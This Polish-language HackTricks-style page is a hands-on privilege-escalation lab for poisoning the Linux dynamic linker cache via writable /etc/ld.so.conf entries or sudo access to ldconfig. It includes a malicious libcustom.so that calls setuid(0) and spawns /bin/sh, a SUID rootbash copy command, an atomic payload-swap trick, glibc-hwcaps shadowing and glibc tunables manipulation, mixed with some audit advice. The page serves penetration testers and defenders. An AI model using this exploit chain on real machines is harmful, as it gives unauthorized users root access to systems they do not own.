# przykład exploitu privesc ld.so

{{#include ../../banners/hacktricks-training.md}}

Ta strona to skoncentrowane laboratorium dotyczące zatruwania **system linker cache za pomocą `/etc/ld.so.conf` lub `ldconfig`**. W przypadku injection brakujących bibliotek, zapisywalnych `RPATH`/`RUNPATH`, `LD_PRELOAD` i innych ogólnych przypadków abuse linkera SUID zobacz [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Przygotuj środowisko

W poniższej sekcji znajdziesz kod plików, których użyjemy do przygotowania środowiska

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Utwórz** te pliki na swoim komputerze w tym samym folderze
2. **Skompiluj** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Skopiuj** `libcustom.so` do `/usr/lib` i odśwież cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (uprawnienia roota)
4. **Skompiluj** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Sprawdź środowisko

Sprawdź, czy _libcustom.so_ jest **ładowany** z _/usr/lib_ oraz czy możesz **uruchomić** plik binarny.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Przydatne polecenia triage

Podczas atakowania rzeczywistego celu sprawdź **dokładną nazwę biblioteki**, której potrzebuje plik binarny, co **loader obecnie rozwiązuje**, oraz które skonfigurowane ścieżki można zapisywać bez modyfikowania aktywnej pamięci podręcznej.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Używaj `ldd` wyłącznie na **zaufanym** pliku wykonywalnym. Niektóre implementacje lub nietypowe interpretery ELF mogą spowodować wykonanie kodu kontrolowanego przez attackera; `objdump -p ./file | grep NEEDED` bezpiecznie wyświetla bezpośrednie zależności. W przypadku zaufanego celu wywołanie znalezionego interpretera z opcją `--list` pokazuje faktyczne rozwiązywanie zależności. Porównaj ten wynik z `--inhibit-cache --list`: różnica dowodzi, że to `/etc/ld.so.cache`, a nie zwykła reguła ścieżki wyszukiwania, wybrał ten obiekt.<sup>[[1]](#references)[[4]](#references)</sup>

Kilka przydatnych pułapek:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` zwykle **nie działa**, ponieważ
przekierowanie jest wykonywane przez bieżący shell. Zamiast tego użyj
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Pliki binarne **SUID/uprzywilejowane** działają w **secure-execution mode**: `LD_LIBRARY_PATH`
jest ignorowane, a `LD_PRELOAD` podlega ograniczeniom (nazwy zawierające ukośnik są
ignorowane, a preładowane mogą być tylko biblioteki oznaczone setuid w standardowych
katalogach). Gdy root uruchomi `ldconfig`, katalogi wymienione w
`/etc/ld.so.conf` mogą trafić do `/etc/ld.so.cache`, więc ta błędna konfiguracja
nadal może wpływać na uprzywilejowane programy.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` również jest ignorowane w secure-execution mode, chyba że istnieje `/etc/suid-debug`, dlatego jego ślad należy zebrać podczas równoważnego uruchomienia non-SUID, zamiast oczekiwać danych wyjściowych z wykonania uprzywilejowanego.<sup>[[1]](#references)</sup>
- W glibc 2.33 i nowszych dynamic loader udostępnia również
`--list-diagnostics`, które wypisuje diagnostykę loadera w formacie czytelnym maszynowo oraz wbudowane informacje o ścieżkach wyszukiwania, gdy hijack nie zachowuje się zgodnie z oczekiwaniami.<sup>[[1]](#references)[[6]](#references)</sup>

### Ograniczenia cache i SONAME

`ldconfig` nie cache'uje każdego dowolnego pliku w skonfigurowanym katalogu: sprawdza nagłówki ELF, rozpoznaje nazwy pasujące do `lib*.so*` lub `ld-*.so*` i oczekuje konwencjonalnego łańcucha `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Wstrzyknięty obiekt musi zatem mieć docelową architekturę/klasę, dokładną nazwę `DT_NEEDED` (zwykle jego `DT_SONAME`) oraz wszystkie symbole/wersje rozwiązywane przez program ofiary.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Preferuj bibliotekę specyficzną dla celu, taką jak w tym przykładzie. Shadowing popularnego SONAME za pomocą niekompletnego obiektu może przerwać działanie każdego procesu, który rozwiąże tę zależność, zanim uruchomi się zamierzony uprzywilejowany cel.<sup>[[3]](#references)</sup>

### Trwałość buforowanej ścieżki i atomowe podmiany

Cache rejestruje mapowanie **nazwy biblioteki na ścieżkę**; nie osadza w sobie shared object. Po zapisaniu w cache ścieżki kontrolowanej przez atakującego zastąpienie obiektu dokładnie pod tą ścieżką wpływa na nowo uruchamiane procesy bez kolejnego uruchamiania `ldconfig`. Umożliwia to użyteczny wzorzec time-of-check/time-of-use: udostępnij prawidłową bibliotekę podczas przebudowy lub inspekcji cache przez administratora, a następnie atomowo zmień nazwę payloadu, zastępując nią ten obiekt. Istniejące procesy zachowują już zmapowany obiekt.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Podobnie usunięcie złośliwej linii z `ld.so.conf` samo w sobie nie usuwa już zapisanego wpisu: administrator musi usunąć niezaufany obiekt, naprawić własność/uprawnienia do zapisu i odbudować cache. Użyj porównania z `--inhibit-cache` powyżej, aby odróżnić nieaktualny wpis w cache od nadal aktywnej ścieżki konfiguracji.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

W tym scenariuszu załóżmy, że administrator dodał podatny wpis do
pliku w `/etc/ld.so.conf.d/`, który jest dołączany przez systemowy
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Podatny folder to _/home/ubuntu/lib_ (do którego mamy dostęp z prawem zapisu).\
**Pobierz i skompiluj** poniższy kod w tej ścieżce:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Jeśli zakładasz, że **root** (lub inne uprzywilejowane konto) uruchomi później podatny plik binarny, zwykle lepiej pozostawić **artefakt należący do root**, zamiast uruchamiać interaktywną powłokę. Na przykład:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Następnie, po wykonaniu uprzywilejowanej operacji, możesz użyć `/tmp/rootbash -p`.

Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom wewnątrz błędnie skonfigurowanej** ścieżki, domyślna pamięć podręczna musi zostać ponownie zbudowana przez pomyślne uprzywilejowane uruchomienie **`ldconfig`**. Ponowne uruchomienie systemu pomaga tylko wtedy, gdy lokalny proces rozruchu faktycznie je wywołuje; w przeciwnym razie należy poczekać na działanie administratora lub użyć niebezpiecznej reguły sudo, jeśli jest dostępna.<sup>[[2]](#references)</sup>

Po wykonaniu tej czynności **ponownie sprawdź**, skąd plik wykonywalny `sharedvuln` ładuje bibliotekę `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Jak widać, **ładuje ją z `/home/ubuntu/lib`**, a jeśli dowolny użytkownik ją wykona, zostanie uruchomiona powłoka:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Zauważ, że w tym przykładzie nie eskalowaliśmy uprawnień, ale modyfikując wykonywane polecenia i **czekając, aż root lub inny uprzywilejowany użytkownik wykona podatny plik binarny**, będziemy mogli eskalować uprawnienia.

### Przesłanianie `glibc-hwcaps`

Od wersji glibc 2.33 loader może preferować zoptymalizowane biblioteki znajdujące się w `glibc-hwcaps/<level>/` wewnątrz **każdego katalogu wyszukiwania bibliotek**. W związku z tym sprawdzanie wyłącznie `/home/ubuntu/lib` jest niewystarczające: zapisywalny kompatybilny podkatalog, taki jak `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, może przesłonić bazową bibliotekę po zindeksowaniu jej przez `ldconfig`, podczas gdy inne procesory nadal będą używać bazowego obiektu. Umożliwia to również przejęcie selektywne względem architektury, które może zostać przeoczone, gdy walidacja odbywa się na innym procesorze.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Obecne zalecenia dotyczące hardeningu glibc rekomendują unikanie zduplikowanych SONAME, niestandardowych lokalizacji wyszukiwania oraz obiektów w podkatalogach `glibc-hwcaps`. Z perspektywy audytu należy rekurencyjnie sprawdzać własność i możliwość zapisu dla skonfigurowanych katalogów oraz wszystkich komponentów ich ścieżek nadrzędnych.<sup>[[3]](#references)</sup>

### Inne błędne konfiguracje - ta sama luka

W poprzednim przykładzie sfingowaliśmy błędną konfigurację, w której administrator **ustawił folder bez uprawnień uprzywilejowanych wewnątrz pliku konfiguracyjnego znajdującego się w `/etc/ld.so.conf.d/`**.\
Istnieją jednak inne błędne konfiguracje, które mogą powodować tę samą lukę: jeśli masz **uprawnienia zapisu** w załadowanym **pliku konfiguracyjnym**, możesz utworzyć plik w zapisywalnym katalogu `/etc/ld.so.conf.d/` lub możesz zapisywać do `/etc/ld.so.conf`, możesz skonfigurować i wykorzystać tę samą lukę.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Załóżmy, że masz uprawnienia sudo do `ldconfig`**. `ldconfig` akceptuje katalogi do skanowania jako argumenty pozycyjne, więc najkrótsza forma zatruwania cache często wygląda po prostu tak:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Alternatywnie, `-f` wybiera inny plik konfiguracyjny, zachowując domyślne wyjście cache. Jest to przydatne, gdy filtr argumentów blokuje katalogi pozycyjne, ale nadal zezwala na `-f`, lub gdy należy wstrzyknąć kilka ścieżek:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Teraz, jak wskazano w **previous exploit**, utwórz złośliwą bibliotekę w `/tmp`.\
Na koniec załaduj ścieżkę i sprawdź, skąd plik binarny ładuje bibliotekę:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Jak widać, posiadając uprawnienia sudo do `ldconfig`, można wykorzystać tę samą podatność.** Szczegóły opcji mają znaczenie podczas oceny ograniczonej reguły sudo: `-f` wybiera inną konfigurację, ale nadal przebudowuje `/etc/ld.so.cache`; `-C` przekierowuje cache w inne miejsce; `-N` zapobiega przebudowie cache; natomiast `-X` zapobiega aktualizowaniu linków, ale **nadal przebudowuje cache, chyba że zostanie użyte razem z `-N`**. `-n` implikuje `-N`, więc może aktualizować linki w podanych katalogach, ale nie może zatruć cache; `-r` działa poniżej alternatywnego katalogu głównego i zwykle nie zmienia cache systemu hosta.<sup>[[2]](#references)</sup>

## glibc 2.44: buforowane tunables systemowe

Od glibc 2.44 `ldconfig` analizuje również `/etc/tunables.conf` i zapisuje jego ustawienia jako rozszerzenie w `/etc/ld.so.cache`. Plik akceptuje dyrektywy `include` oraz filtry dla poszczególnych procesów. Prefiksy kontrolują zakres: `@` obejmuje wyłącznie procesy `AT_SECURE`, `$` je wyklucza, a `*` obejmuje oba typy. Poszerza to granice audytu poza katalogi bibliotek: zapisywalna konfiguracja tunables lub dołączony plik może wpływać na uruchamianie przyszłych programów po uprzywilejowanej przebudowie cache.<sup>[[7]](#references)</sup>

To samo wydanie dodaje `ldconfig -t TUNCONF`, które wybiera alternatywny plik tunables, jednocześnie nadal zapisując standardowy cache, chyba że inna opcja zmieni to zachowanie. Dlatego wrappery i reguły sudo, które próbowały blokować tylko `-f`, muszą również odrzucać `-t`, dowolne katalogi pozycyjne oraz manipulowanie wyjściem cache.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Nie jest to automatycznie arbitrary code execution. Jest to uprzywilejowany prymityw **loader-behavior manipulation**: glibc wyraźnie ostrzega, że wartości systemowe mogą stosować wrażliwe pod względem bezpieczeństwa tunables do programów setuid/setgid bez sprawdzania bezpieczeństwa poszczególnych tunables. Wylicz rzeczywiste tunables hosta za pomocą `--list-tunables` i szukaj specyficznych dla celu zmian allocatorów, zmian wzmacniających bezpieczeństwo CPU lub warunków denial-of-service, zamiast zakładać uniwersalny payload.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Wzmacnianie Dynamic Linker - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - strona podręcznika Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (Narzędzia binarne GNU)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnostyka Dynamic Linker (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Tunables systemowe (GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Dodanie tunables systemowych: część ldconfig (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
